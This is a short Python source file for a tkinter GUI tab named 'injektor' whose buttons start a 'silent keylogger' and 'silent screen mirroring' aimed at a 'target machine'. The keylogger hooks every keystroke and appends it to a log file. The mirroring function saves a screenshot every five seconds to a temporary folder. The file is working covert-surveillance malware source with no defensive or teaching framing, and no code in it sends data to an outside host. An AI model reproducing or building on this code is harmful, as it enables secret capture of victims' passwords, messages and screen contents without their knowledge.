import threading
import tkinter as tk
from tkinter import ttk, messagebox
import keyboard
import pyautogui
import os
import time
import tempfile

screenshot_dir = tempfile.mkdtemp()

def silent_keylogger():
    with open("keylog.txt", "a") as f:
        def on_key_press(event):
            f.write(event.name + "\n")
        keyboard.hook(on_key_press)
        keyboard.wait()
        keyboard.unhook(on_key_press)

def silent_screen_mirroring():
    while True:
        screenshot = pyautogui.screenshot()
        timestamp = str(int(time.time()))
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        time.sleep(5)

def setup_injektor_gui(injektor_tab):
    def silent_keylogger_gui():
        threading.Thread(target=silent_keylogger).start()
        messagebox.showinfo("Silent Keylogger", "Silent keylogger started.")

    def silent_screen_mirroring_gui():
        threading.Thread(target=silent_screen_mirroring).start()
        messagebox.showinfo("Silent Screen Mirroring", "Silent screen mirroring started.")

    silent_keylogger_button = ttk.Button(injektor_tab, text="Start Silent Keylogger", command=silent_keylogger_gui)
    silent_keylogger_button.pack(pady=5, padx=5)
    silent_keylogger_button.bind("<Enter>", lambda e: silent_keylogger_button.config(text="Start silent keylogger on the target machine"))
    silent_keylogger_button.bind("<Leave>", lambda e: silent_keylogger_button.config(text="Start Silent Keylogger"))

    silent_screen_mirroring_button = ttk.Button(injektor_tab, text="Start Silent Screen Mirroring", command=silent_screen_mirroring_gui)
    silent_screen_mirroring_button.pack(pady=5, padx=5)
    silent_screen_mirroring_button.bind("<Enter>", lambda e: silent_screen_mirroring_button.config(text="Start silent screen mirroring on the target machine"))
    silent_screen_mirroring_button.bind("<Leave>", lambda e: silent_screen_mirroring_button.config(text="Start Silent Screen Mirroring"))
